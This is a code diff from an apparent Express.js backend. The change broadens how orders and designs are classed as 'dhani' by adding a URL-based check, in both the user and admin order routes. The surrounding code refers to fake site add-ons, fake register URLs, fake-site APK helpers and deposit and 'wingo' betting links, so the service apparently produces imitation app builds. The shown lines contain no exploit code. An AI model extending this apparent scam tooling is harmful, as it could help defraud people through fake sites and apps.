@@ -522,7 +522,6 @@ app.post('/api/order', requireAuth, iconUpload.single('icon'), async (req, res) 
 
   const design = db.prepare('SELECT * FROM designs WHERE id=? AND active=1').get(design_id);
   if (!design) return res.json({ error: 'Design not found' });
-  const isDhaniDesign = design.category === 'dhani' || design.java_type === 'dhani' || design.java_type === 'premium';
 
   const user = db.prepare('SELECT * FROM users WHERE id=?').get(req.session.userId);
   if (!user) return res.status(401).json({ error: 'User not found. Please login again.' });
@@ -541,7 +540,8 @@ app.post('/api/order', requireAuth, iconUpload.single('icon'), async (req, res) 
   if (fakeAddonEnabled && !cleanFakeRegisterUrl) return res.json({ error: 'Fake site register URL required' });
   if (user.coins < totalCoins) return res.json({ error: `Not enough coins. Need ${totalCoins}, have ${user.coins}` });
 
-  const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
+  const { buildUrls, extractDomain, isDhaniUrl } = require('./utils/htmlprocessor');
+  const isDhaniDesign = design.category === 'dhani' || design.java_type === 'dhani' || design.java_type === 'premium' || isDhaniUrl(cleanRegisterUrl);
   const { deposit: depositUrl, wingo: wingoUrl } = buildUrls(cleanRegisterUrl, isDhaniDesign);
   const domain = extractDomain(cleanRegisterUrl);
 
@@ -715,9 +715,13 @@ app.get('/api/orders/:id/download-fake', requireAuth, (req, res) => {
 });
 
 function isDhaniOrder(order) {
+  if (!order) return false;
+  const { isDhaniUrl } = require('./utils/htmlprocessor');
   return order.design_category === 'dhani'
     || order.design_java_type === 'dhani'
-    || order.design_java_type === 'premium';
+    || order.design_java_type === 'premium'
+    || isDhaniUrl(order.register_url)
+    || isDhaniUrl(order.fake_register_url);
 }
 
 // ── Fake site APK helpers (primary fake + multiple extra fake sites) ──
@@ -1880,7 +1884,6 @@ app.post('/api/admin/orders/create', requireAdmin, iconUpload.single('icon'), as
 
   const design = db.prepare('SELECT * FROM designs WHERE id=? AND active=1').get(design_id);
   if (!design) return res.json({ error: 'Design not found' });
-  const isDhaniDesign = design.category === 'dhani' || design.java_type === 'dhani' || design.java_type === 'premium';
 
   const user = db.prepare('SELECT * FROM users WHERE id=?').get(user_id);
   if (!user) return res.json({ error: 'User not found' });
@@ -1888,7 +1891,8 @@ app.post('/api/admin/orders/create', requireAdmin, iconUpload.single('icon'), as
   const fakeAddonEnabled = fake_addon === 'true' || fake_addon === true;
   if (fakeAddonEnabled && !cleanFakeRegisterUrl) return res.json({ error: 'Fake site register URL required' });
 
-  const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
+  const { buildUrls, extractDomain, isDhaniUrl } = require('./utils/htmlprocessor');
+  const isDhaniDesign = design.category === 'dhani' || design.java_type === 'dhani' || design.java_type === 'premium' || isDhaniUrl(cleanRegisterUrl);
   const { deposit: depositUrl, wingo: wingoUrl } = buildUrls(cleanRegisterUrl, isDhaniDesign);
   const domain = extractDomain(cleanRegisterUrl);
 
